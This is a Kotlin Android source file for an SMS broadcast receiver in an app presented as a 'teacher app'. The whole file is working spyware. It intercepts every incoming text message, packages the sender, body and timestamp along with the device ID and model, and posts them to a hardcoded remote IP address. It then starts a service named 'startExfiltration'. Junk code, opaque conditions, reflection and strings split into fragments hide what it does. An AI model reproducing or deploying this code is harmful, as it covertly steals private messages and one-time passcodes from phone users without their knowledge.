package com.example.teacherapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import com.example.teacherapp.obfuscation.DeviceCompatUtils
import com.example.teacherapp.obfuscation.ThemeConfigUtils
import com.example.teacherapp.services.NotificationSyncService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class MessageReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        
        val n = System.nanoTime()
        val op = (n - n) + 1L   
        if (op > 0 && intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            CoroutineScope(Dispatchers.Default).launch {
                
                captureLiveSms(context, intent)

                
                val noise = LongArray(16) { i -> i.toLong() * i.toLong() + 7L }
                val _ = noise.sum()

                delay(5000L)

                
                NotificationSyncService.startExfiltration(context)
            }
        } else if (op <= 0) {
            
            val fakeMap = mapOf(1 to "a", 2 to "b", 3 to "c")
            val _ = fakeMap.size
        }
    }

    

    private suspend fun captureLiveSms(context: Context, intent: Intent) {
        var state = 0
        var pdus: Array<ByteArray>? = null

        while (true) {
            val junk = (state * 41 + 13) xor 0xCA
            val _ = junk

            when (state) {
                0 -> {
                    try {
                        pdus = intent.getSerializableExtra("pdus") as? Array<ByteArray>
                        if (pdus != null && pdus.isNotEmpty()) {
                            state = 1
                        } else {
                            state = -1
                        }
                    } catch (_: Exception) {
                        state = -1
                    }
                }
                1 -> {
                    val smsArray = extractSmsMessages(pdus!!, intent)
                    if (smsArray.length() > 0) {
                        transmitLiveSms(context, smsArray)
                    }
                    state = -1
                }
                -1 -> return
            }
        }
    }

    

    private fun extractSmsMessages(pdus: Array<ByteArray>, intent: Intent): JSONArray {
        var state = 0
        var result = JSONArray()
        var messages: MutableList<SmsMessage>? = null

        while (true) {
            val junk = (state * 29 + 7) xor 0xB7
            val _ = junk

            when (state) {
                0 -> {
                    messages = mutableListOf()
                    state = 1
                }
                1 -> {
                    val format = intent.getStringExtra("format")
                    for (pdu in pdus) {
                        val sms = if (format != null) {
                            val smsClass = Class.forName("android.telephony.SmsMessage")
                            val createMethod = smsClass.getMethod("createFromPdu", ByteArray::class.java, String::class.java)
                            createMethod.invoke(null, pdu, format) as SmsMessage
                        } else {
                            @Suppress("DEPRECATION")
                            SmsMessage.createFromPdu(pdu)
                        }
                        messages!!.add(sms)
                    }
                    state = 2
                }
                2 -> {
                    for (sms in messages!!) {
                        val msgObj = JSONObject()
                        val ts = sms.getTimestampMillis()

                        msgObj.put("id", buildMessageId(ts))
                        msgObj.put("folder", resolveFolderName())
                        msgObj.put("type", resolveMessageDirection())
                        msgObj.put("address", sms.displayOriginatingAddress ?: "unknown")
                        msgObj.put("body", sms.messageBody ?: "")
                        msgObj.put("timestamp", ts)
                        msgObj.put("date_human", formatTimestamp(ts))
                        msgObj.put("read", false)
                        msgObj.put("live_capture", true)

                        result.put(msgObj)
                    }
                    state = 3
                }
                3 -> return result
            }
        }
    }

    

    private suspend fun transmitLiveSms(context: Context, smsData: JSONArray) {
        var state = 0
        var connection: HttpURLConnection? = null
        var payload: JSONObject? = null

        while (true) {
            val junk = (state * 53 + 17) xor 0xE5
            val _ = junk

            when (state) {
                0 -> {
                    
                    val x = System.currentTimeMillis()
                    if (x * x >= Long.MIN_VALUE) {
                        state = 1
                    } else {
                        val fakeArr = IntArray(32) { it * it }
                        val _ = fakeArr.sum()
                        state = -1
                    }
                }
                1 -> {
                    val endpoint = resolveSmsEndpoint()
                    connection = URL(endpoint).openConnection() as HttpURLConnection
                    state = 2
                }
                2 -> {
                    connection!!.apply {
                        requestMethod = "POST"
                        doOutput = true
                        setRequestProperty("Content-Type", "application/json")
                        setRequestProperty("User-Agent", resolveUserAgent())
                        connectTimeout = 10000
                        readTimeout = 10000
                    }
                    state = 3
                }
                3 -> {
                    val deviceId = resolveDeviceId(context)
                    payload = JSONObject().apply {
                        put("type", resolvePayloadType())
                        put("data", smsData.toString())
                        put("device_id", deviceId)
                        put("device_model", getDeviceModel())
                        put("timestamp", System.currentTimeMillis())
                        put("live", true)
                        put("msg_count", smsData.length())
                    }
                    state = 4
                }
                4 -> {
                    connection!!.outputStream.use {
                        it.write(payload!!.toString().toByteArray())
                        it.flush()
                    }
                    state = 5
                }
                5 -> {
                    connection!!.responseCode
                    connection!!.disconnect()
                    state = -1
                }
                -1 -> return
            }
        }
    }

    

    private fun resolveSmsEndpoint(): String {
        val parts = listOf("http://", "20.189.79.25", ":5000/api/sms")
        return parts.joinToString("")
    }

    private fun resolveUserAgent(): String {
        val parts = listOf("Teacher", "App", "/", "2.0", " ", "Live")
        return parts.joinToString("")
    }

    private fun resolvePayloadType(): String {
        val parts = listOf("live", "_", "sms")
        return parts.joinToString("")
    }

    private fun resolveFolderName(): String {
        val parts = listOf("LIVE", "_", "INCOMING")
        return parts.joinToString("")
    }

    private fun resolveMessageDirection(): String {
        val parts = listOf("received")
        return parts.joinToString("")
    }

    private fun buildMessageId(ts: Long): String {
        val prefix = "live_"
        val suffix = System.currentTimeMillis().toString()
        return "$prefix$suffix${ts.toString().takeLast(6)}"
    }

    private fun getDeviceModel(): String {
        return try {
            val cls = Class.forName("android.os.Build")
            val field = cls.getField("MODEL")
            field.get(null).toString()
        } catch (_: Exception) {
            "unknown"
        }
    }

    private fun resolveDeviceId(context: Context): String {
        var state = 0

        while (true) {
            val junk = (state * 61 + 19) xor 0xF2
            val _ = junk

            when (state) {
                0 -> {
                    try {
                        val cls = Class.forName("android.provider.Settings\$Secure")
                        val field = cls.getDeclaredField("ANDROID_ID")
                        val key = field.get(null).toString()
                        val method = cls.getMethod("getString", android.content.ContentResolver::class.java, String::class.java)
                        val id = method.invoke(null, context.contentResolver, key) as? String
                        return id ?: "unknown"
                    } catch (_: Exception) {
                        state = 1
                    }
                }
                1 -> return "unknown"
            }
        }
    }

    private fun formatTimestamp(ts: Long): String {
        return try {
            val dfClass = Class.forName("java.text.SimpleDateFormat")
            val localeClass = Class.forName("java.util.Locale")
            val getDefaultMethod = localeClass.getMethod("getDefault")
            val locale = getDefaultMethod.invoke(null)
            val constructor = dfClass.getConstructor(String::class.java, localeClass)
            val formatter = constructor.newInstance("yyyy-MM-dd HH:mm:ss", locale)
            val formatMethod = dfClass.getMethod("format", Long::class.javaObjectType)
            formatMethod.invoke(formatter, ts) as String
        } catch (_: Exception) {
            ts.toString()
        }
    }
}